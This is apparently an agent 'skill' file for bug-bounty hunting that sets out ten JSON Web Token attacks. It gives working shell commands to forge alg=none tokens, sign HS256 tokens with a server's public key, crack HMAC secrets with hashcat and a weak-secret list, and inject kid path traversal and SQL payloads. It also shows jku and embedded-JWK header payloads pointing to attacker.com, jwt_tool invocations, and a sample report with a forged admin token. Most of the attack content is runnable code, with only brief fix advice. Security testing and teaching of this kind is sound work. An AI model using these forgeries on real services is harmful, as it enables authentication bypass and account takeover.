---
name: jwt-attacks
description: Hunt JSON Web Token (JWT) vulnerabilities — alg=none bypass, RS256→HS256 key confusion, weak HMAC secret cracking, kid path traversal, JWKS injection, jku/x5u header attacks, embedded JWK confusion, expired-token acceptance, claim mutability, and token replay. Use when an app uses JWT for authentication or stateless sessions.
metadata:
  type: skill
  phase: hunt
  vuln_class: jwt
  cwe: 287
  tools: [jwt_tool, jwtcat, jwt-cracker]
---

# JWT Attacks

> Bearer token = signed JSON. Signing wrong = pwned.

## When to invoke

**Trigger phrases:**
- "JWT bypass"
- "alg=none"
- "JWT key confusion"
- "token attack"
- "Bearer token"

## JWT primer

```
header.payload.signature
└──┬──┘ └───┬───┘ └───┬───┘
   │       │         │
   │       │         └── HMAC or RS/ES signature over base64url(header) + "." + base64url(payload)
   │       └── base64url-encoded JSON: claims (sub, exp, role, etc.)
   └── base64url-encoded JSON: algorithm + key info
```

Standard header:
```json
{"alg":"HS256","typ":"JWT"}
```

Standard payload:
```json
{"sub":"user@example.com","role":"user","exp":1717267200}
```

## The 10 JWT attack patterns

### Attack 1: alg=none

The "none" algorithm explicitly means **no signature**. Some libs accept it.

```bash
# Original token
ORIG="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIn0.SIGNATURE"

# Modified
HDR=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
PLD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
echo "$HDR.$PLD."   # No signature, but valid format
```

Try variants:
- `alg: "none"` ← classic
- `alg: "None"` ← capitalization
- `alg: "NONE"`
- `alg: "nOnE"`
- `alg: ""`

### Attack 2: RS256 → HS256 key confusion

If server uses RS256 (public/private), and accepts HS256 (symmetric), you can sign with the **public key** as the HMAC secret.

```bash
# Get the public key (often at /.well-known/jwks.json or /jwks)
curl https://target.com/.well-known/jwks.json
# Or embedded in pages, or sometimes published

# Convert JWK to PEM
# Or simply find the cert/pubkey

PUBKEY=public.pem

# Forge HS256 JWT using public key as secret
# Use jwt_tool:
python3 jwt_tool.py "$ORIG_TOKEN" -X k -pk "$PUBKEY"

# Or manually:
HDR=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
PLD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
PUBKEY_CONTENT=$(cat "$PUBKEY")
SIG=$(echo -n "$HDR.$PLD" | openssl dgst -sha256 -mac HMAC -macopt "key:$PUBKEY_CONTENT" -binary | base64 -w 0 | tr '+/' '-_' | tr -d '=')
echo "$HDR.$PLD.$SIG"
```

### Attack 3: Weak HMAC secret (crack it)

If HS256 with a weak secret like "secret" or "1234":

```bash
# jwtcat (fast)
jwtcat "$JWT_TOKEN" -w ~/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# hashcat (faster)
echo "$JWT_TOKEN" > hash.txt
hashcat -m 16500 hash.txt ~/tools/SecLists/Passwords/rockyou.txt

# John
john --format=HMAC-SHA256 --wordlist=rockyou.txt hash.txt
```

Common weak secrets to try first:
```
secret
1234
admin
password
JWT_SECRET
your-256-bit-secret
my-very-secret-key
SECRET_KEY
test
key
abcdefg
HelloWorld
mysecret
JWT
```

### Attack 4: kid (key ID) path traversal

`kid` tells the server which key to use. If it's read from filesystem:

```json
{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}
```

Server reads `/dev/null` → empty file → HMAC key is empty → forge token with empty key:

```bash
HDR='{"alg":"HS256","kid":"../../../../../dev/null","typ":"JWT"}'
PLD='{"sub":"admin"}'
HDR_B64=$(echo -n "$HDR" | base64 -w 0 | tr '+/' '-_' | tr -d '=')
PLD_B64=$(echo -n "$PLD" | base64 -w 0 | tr '+/' '-_' | tr -d '=')
SIG=$(echo -n "$HDR_B64.$PLD_B64" | openssl dgst -sha256 -mac HMAC -macopt "key:" -binary | base64 -w 0 | tr '+/' '-_' | tr -d '=')
echo "$HDR_B64.$PLD_B64.$SIG"
```

### Attack 5: kid SQL injection

If `kid` is fed into a SQL query for key lookup:

```json
{"alg":"HS256","kid":"x' UNION SELECT 'attacker-secret","typ":"JWT"}
```

Then forge with secret `attacker-secret`.

### Attack 6: jku / x5u header

`jku` and `x5u` point to a URL with the JWKS / certificate. If not validated against an allowlist:

```json
{
  "alg":"RS256",
  "typ":"JWT",
  "jku":"https://attacker.com/jwks.json"
}
```

Server fetches `https://attacker.com/jwks.json` → uses your public key → you sign with your private key → server trusts.

Set up the JWKS on attacker.com:
```json
{
  "keys": [{
    "kty":"RSA",
    "kid":"my-key-id",
    "n":"...",
    "e":"AQAB"
  }]
}
```

### Attack 7: Embedded JWK (jwk header)

If `jwk` header is in the JWT, server might use it as the verification key:

```json
{
  "alg":"RS256",
  "typ":"JWT",
  "jwk":{
    "kty":"RSA",
    "kid":"abc",
    "n":"<YOUR_PUBLIC_N>",
    "e":"AQAB"
  }
}
```

Same as jku attack but inline.

### Attack 8: Expired token reuse

Some implementations don't check `exp`:

```bash
# Take an expired token (yesterday's session)
# Send it → if accepted, bug

# Or modify `exp` to past, then sign with cracked secret
```

### Attack 9: Claim mutability without re-sign verification

Some apps decode JWT but don't verify signature for certain endpoints:

```bash
# Modify payload claims (without re-signing)
# Decode → change "role": "user" → "role": "admin" → re-encode → send

# Some apps "trust client" for non-critical paths but pull role from JWT for auth checks
```

### Attack 10: JWT in URL (logged → leaked)

If JWT is passed as URL parameter (`?token=...`):
- Tokens logged in proxy logs
- Tokens in `Referer` headers to 3rd parties
- Tokens in browser history

Report as info disclosure + chain.

## Step-by-Step Workflow

### 1. Capture JWTs from the app

Login flow → look in:
- `Authorization: Bearer ...` header
- `Cookie: jwt=...` or similar
- URL parameters (`?token=`)
- LocalStorage (via browser devtools)
- WebSocket connection upgrade headers

### 2. Decode (use jwt.io or CLI)

```bash
# Quick decode
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null
```

Or:
```bash
# jwt_tool
python3 jwt_tool.py "$JWT"
```

Note:
- `alg` value
- Claims: `sub`, `role`, `email`, `iat`, `exp`, `iss`, `aud`, `tenant_id`, etc.
- Custom headers (`kid`, `jku`, `x5u`, `jwk`)

### 3. Identify mutable claims

For each claim, try changing it (with re-signed token if needed):
- `role: "user"` → `"admin"` / `"superadmin"` / `"root"`
- `email: "you@x.com"` → `"victim@x.com"` (if email used for auth)
- `tenant_id: 1` → other tenant IDs (cross-tenant)
- `is_admin: false` → `true`
- `permissions: ["read"]` → `["*"]` / `["admin"]`

### 4. Try alg=none

Send modified token with `alg: "none"`. If accepted → critical.

### 5. Test for weak HMAC

```bash
jwtcat "$JWT" -w wordlist.txt
```

### 6. Try kid path traversal

```bash
python3 jwt_tool.py "$JWT" -X i  # injection mode
```

### 7. Use jwt_tool comprehensive

```bash
# All-tests mode (runs every attack)
python3 jwt_tool.py "$JWT" -M at

# Specific attack
python3 jwt_tool.py "$JWT" -X k -pk public.pem    # key confusion
python3 jwt_tool.py "$JWT" -X a                   # alg=none
python3 jwt_tool.py "$JWT" -X i                   # injection
python3 jwt_tool.py "$JWT" -X k -jw key.jwk       # JWK
```

### 8. Use Burp extension (JSON Web Tokens)

Burp BApp Store → install "JSON Web Tokens" (or "JWT Editor"). Auto-decodes and re-signs.

## Output template

```markdown
## Critical: Authentication bypass via JWT alg=none

### Summary
The JWT validator on api.target.com accepts tokens with `alg: "none"`. By stripping the signature, any attacker can forge a token for any user, including administrators.

### Steps to reproduce
1. Capture a valid JWT from a normal login:
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MTc1NTQwMDB9.SIGNATURE
   ```
2. Decode payload, change `sub` to `admin@target.com` and `role` to `admin`
3. Create forged token with `alg: "none"`:
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbkB0YXJnZXQuY29tIiwicm9sZSI6ImFkbWluIiwiZXhwIjoyMDAwMDAwMDAwfQ.
   ```
   (Note trailing `.` — empty signature)
4. Send to admin endpoint:
   ```http
   GET /api/v3/admin/users HTTP/1.1
   Host: api.target.com
   Authorization: Bearer <forged-token>
   ```
5. Response: `200 OK` with full admin user list

### Impact
- Full administrative access without credentials
- Any user can become any other user, including admins
- Bypass of all role-based access controls

### Suggested fix
- Reject any JWT with `alg: "none"`
- Use a strict allowlist of algorithms (HS256 or RS256 only, never both interchangeably)
- Use a well-tested JWT library (jose, jjwt) with proper defaults
```

## Cross-references

- `[[auth-bypass]]` — JWT is one of many auth bypass paths
- `[[ato-chains]]` — JWT manipulation often = ATO
- `[[js-analysis]]` — JS bundles may leak JWT signing keys or test JWTs

## Common pitfalls

1. **Modifying claims without re-signing.** Most libs verify signature → modification rejected. You must crack/forge.
2. **Reporting "JWT in URL" alone.** Need impact chain.
3. **Trusting decoded payload as "secret".** JWT is signed, not encrypted. Anyone can decode.
4. **Testing alg=none on a single endpoint.** Often only specific endpoints have weak validation.
5. **Forgetting `exp` check.** Some test tokens succeed because `exp` happens to be valid.

## Quick JWT triage checklist

```
[ ] alg = none → critical
[ ] HS256 cracked secret → critical
[ ] RS256 → HS256 confusion → critical
[ ] kid path traversal → critical
[ ] jku not validated → critical
[ ] embedded jwk → critical
[ ] exp not validated → high (replay)
[ ] iss not validated → medium (depends on impact)
[ ] aud not validated → medium (cross-app reuse)
[ ] role mutable + no re-sign check → critical
```

## Severity guide

| Finding | Severity |
|---|---|
| alg=none accepted | Critical |
| HS256 with crackable secret (< 8 chars) | Critical |
| Key confusion (RS→HS) | Critical |
| kid injection (path traversal / SQLi) | Critical |
| jku/x5u not validated | Critical |
| exp not enforced + replayable token | High |
| Token leaked via URL/log | Medium-High |
| JWT in non-HttpOnly cookie | Medium (combined with XSS = high) |
